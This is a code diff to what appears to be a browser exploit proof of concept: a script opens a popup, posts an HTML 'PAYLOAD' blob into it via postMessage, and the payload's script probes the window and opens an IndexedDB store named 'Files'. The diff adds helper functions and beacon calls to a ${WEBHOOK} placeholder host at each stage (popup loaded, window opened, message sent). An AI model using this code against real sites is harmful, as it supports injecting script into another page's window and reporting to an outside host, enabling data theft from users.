@@ -12,6 +12,18 @@ const PAYLOAD = `<!DOCTYPE html>
   <body>
   Hello! 
   <script>
+    function post(url, data) {
+      let xhr = new XMLHttpRequest();
+      xhr.open("POST", url, true);
+      return xhr.send(JSON.stringify(data));
+    }
+    function get(url) {
+      let xhr = new XMLHttpRequest();
+      xhr.open("GET", url, true);
+      return xhr.send(null);
+    }
+
+    get("${WEBHOOK}?popup");
     console.log("Location", window.location.pathname);
     console.log("Document", document.parent);
     console.log("Window", window.parent);
@@ -19,12 +31,6 @@ const PAYLOAD = `<!DOCTYPE html>
     window.addEventListener('message', function(event) {
       console.log("Message", event);
     });
-
-    function post(url, data) {
-      let xhr = new XMLHttpRequest();
-      xhr.open("POST", url, true);
-      return xhr.send(JSON.stringify(data));
-    }
 
     (async () => {
       const request = indexedDB.open("Files", 1);
@@ -61,12 +67,24 @@ const PAYLOAD = `<!DOCTYPE html>
 </html>
 `;
 
+function post(url, data) {
+  let xhr = new XMLHttpRequest();
+  xhr.open("POST", url, true);
+  return xhr.send(JSON.stringify(data));
+}
+function get(url) {
+  let xhr = new XMLHttpRequest();
+  xhr.open("GET", url, true);
+  return xhr.send(null);
+}
+
 // Open a new window to the specified URL
 const newWindow = window.open(URL, "myWindow", "width=600,height=400");
-console.warn("Popup opened", newWindow);
+get(`${WEBHOOK}?open`);
 
 // Function to send a post message to the new window
 function sendMessageToNewWindow() {
+  get(`${WEBHOOK}?sent`);
   const blob = new Blob([PAYLOAD], { type: "text/html" });
   newWindow.postMessage(
     {
